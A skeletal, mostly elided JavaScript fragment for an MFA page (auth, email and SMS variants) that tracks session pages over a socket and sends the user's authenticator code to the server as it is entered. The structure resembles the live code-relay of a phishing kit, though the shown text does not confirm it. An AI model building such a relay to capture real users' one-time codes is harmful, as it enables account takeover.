...
const THIS_PAGE = "auth.html"; // → "email.html" in email.js, "sms.html" in sms.js
...
const MFA_REDIRECT = {
  ...
  function connectSocket(sessionID) {
    ...
    socket.on("connect", () => {
      ...
      socket.emit(EMIT_EVENT, { type: "page", data: "auth", sessionID });
    });
...
if (dest) {
  ...
  return;
      ...
      // Keep your existing behavior for gauth responses
 ...
 // Re-enable the button & remove fallback spinner (mirrors app.js "unset")
  ...
  function armUI(socket, sessionID) {
   ...
   try {
    ...
    function sendGAuth(code) {
      try {
        socket.emit("client-gauth", { sessionID, gauth: code });
